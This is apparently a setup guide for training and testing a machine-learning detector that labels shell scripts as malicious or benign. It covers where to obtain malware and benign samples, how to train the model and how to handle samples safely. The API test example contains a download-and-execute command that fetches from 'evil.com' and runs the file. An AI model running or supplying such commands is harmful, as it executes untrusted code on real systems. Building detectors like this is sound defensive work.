# Dataset Setup Guide

## 📁 Where to Add Your Datasets

Place your shell script samples in these directories:

```
ML_Engine/datasets/raw/
├── malicious/     ← Add 20 malicious .sh files here
└── benign/        ← Add 20 benign .sh files here
```

**Current Status**:
- ✅ malicious/test.sh (downloaded from S3)
- ✅ benign/env.sh (downloaded from S3)
- ❌ Need 19 more malicious samples
- ❌ Need 19 more benign samples

---

## 🔍 Where to Find Malicious Samples

### Option 1: MalwareBazaar (Recommended)
```bash
# Visit: https://bazaar.abuse.ch/browse/
# Filter by: File Type = sh, bash
# Download samples (requires free account)
```

### Option 2: VirusShare
```bash
# Visit: https://virusshare.com/
# Search for: .sh files
# Download with caution!
```

### Option 3: GitHub Malware Collections
```bash
# Example repositories (use with caution!):
# - https://github.com/ytisf/theZoo
# - https://github.com/vxunderground/MalwareSourceCode

# ⚠️ WARNING: Only download in isolated VM environment!
```

### Option 4: Your Own S3 Analyzed Samples
If users have uploaded malicious scripts to SANDIA, you can download them:

```bash
# List malicious samples from S3
aws s3 ls s3://sandia-jobs/uploads/ --recursive

# Download specific file
aws s3 cp s3://sandia-jobs/uploads/[path]/[file].sh ML_Engine/datasets/raw/malicious/
```

---

## ✅ Where to Find Benign Samples

### Option 1: GitHub DevOps Scripts
```bash
# Search GitHub for:
# - "setup.sh"
# - "install.sh"
# - "deploy.sh"
# - "backup.sh"

# Example repositories:
# - https://github.com/robbyrussell/oh-my-zsh
# - https://github.com/nvm-sh/nvm
# - https://github.com/pyenv/pyenv
```

### Option 2: System Utility Scripts
```bash
# Copy system scripts (on Mac/Linux):
cp /usr/local/bin/*.sh ML_Engine/datasets/raw/benign/

# Or from your own projects:
cp ~/path/to/your/scripts/*.sh ML_Engine/datasets/raw/benign/
```

### Option 3: Package Installation Scripts
```bash
# Download official installation scripts:
# - Node.js install script
# - Homebrew install script
# - Python venv scripts
# - Docker setup scripts
```

---

## 📝 Dataset Quality Guidelines

### Malicious Samples Should Include:
- ✅ Network operations (curl, wget, nc)
- ✅ Download-and-execute patterns
- ✅ Reverse shells
- ✅ Obfuscation/encoding
- ✅ Privilege escalation attempts
- ✅ Persistence mechanisms
- ✅ Anti-forensics (history -c, log cleanup)
- ✅ Crypto miners
- ✅ Backdoors

### Benign Samples Should Include:
- ✅ System administration scripts
- ✅ Deployment scripts
- ✅ Backup scripts
- ✅ Monitoring scripts
- ✅ Package installation scripts
- ✅ Environment setup scripts
- ✅ Build scripts
- ✅ Testing scripts

---

## 🚀 Quick Start After Adding Datasets

### Step 1: Verify Dataset
```bash
cd ML_Engine

# Count samples
ls -1 datasets/raw/malicious/*.sh | wc -l
ls -1 datasets/raw/benign/*.sh | wc -l

# Should show at least 20 each
```

### Step 2: Install Dependencies
```bash
# Create virtual environment
python3 -m venv venv
source venv/bin/activate  # Mac/Linux

# Install packages
pip install -r requirements.txt
```

### Step 3: Train GNN Model
```bash
# Train the model (takes 5-10 minutes on Mac)
python src/gnn/train.py

# Output will show:
# - Training progress
# - Validation metrics
# - Model saved location
```

### Step 4: Test Inference
```bash
# Test the trained model
python src/gnn/inference.py

# Should show prediction on test script
```

### Step 5: Start ML API Server
```bash
# Start Flask server
python api/server.py

# Server runs on http://localhost:5001
```

### Step 6: Test API
```bash
# Test with curl
curl -X POST http://localhost:5001/api/ml/gnn/analyze \
  -H "Content-Type: application/json" \
  -d '{
    "script_content": "#!/bin/bash\nwget http://evil.com/malware\nchmod +x malware\n./malware"
  }'

# Should return:
# {
#   "is_malicious": true,
#   "risk_score": 89.5,
#   "confidence": 0.92,
#   "attack_pattern": "download-and-execute",
#   ...
# }
```

---

## 🔐 Important Security Notes

### When Handling Malware Samples:

1. **Never execute** malicious scripts on your primary machine
2. **Use a VM** or isolated Docker container for handling malware
3. **Disable network** when analyzing unknown scripts
4. **Keep backups** before experimenting with malware
5. **Use antivirus** to scan downloaded samples

### Safe Malware Handling Commands:
```bash
# Download to isolated directory
mkdir -p ~/malware_samples_isolated
cd ~/malware_samples_isolated

# Download with read-only permissions
wget [url] -O sample.sh && chmod 444 sample.sh

# Analyze without executing
cat sample.sh  # View content
python /path/to/ML_Engine/src/gnn/inference.py  # Analyze safely
```

---

## 📊 Expected Training Results

With 20 malicious + 20 benign samples, expect:
- **Training Time**: 5-10 minutes on Mac (CPU)
- **Accuracy**: 75-90% (depends on sample quality)
- **Model Size**: ~500KB
- **Inference Speed**: <100ms per script

With 100+ samples per class:
- **Accuracy**: 90-95%
- **Inference Speed**: Same (<100ms)

---

## ❓ Troubleshooting

### Problem: "Only 2 samples found"
**Solution**: Add more .sh files to datasets/raw/malicious/ and datasets/raw/benign/

### Problem: "bashlex parse error"
**Solution**: Some complex bash syntax may fail. The system has a fallback regex parser.

### Problem: "Model accuracy is low (<70%)"
**Solutions**:
- Add more diverse samples
- Ensure samples are correctly labeled
- Check if samples are actually malicious/benign
- Increase training epochs (edit src/gnn/train.py)

### Problem: "torch-geometric installation fails"
**Solution**:
```bash
pip install torch==2.1.0
pip install torch-geometric -f https://data.pyg.org/whl/torch-2.1.0+cpu.html
```

---

## 📈 Next Steps After Training

1. ✅ Train GNN model
2. ✅ Start ML API server
3. ⬜ Integrate with backend (sandia-backend)
4. ⬜ Add "Use ML" tab to frontend
5. ⬜ Test end-to-end with file upload
6. ⬜ Add BERT integration (Phase 2)
7. ⬜ Add Bedrock integration (Phase 3)

---

**Questions?** Check ML_Engine/README.md or ask for help!

**Developer**: Ajay S Patil | **Institution**: RV University | **Year**: 2024-2025
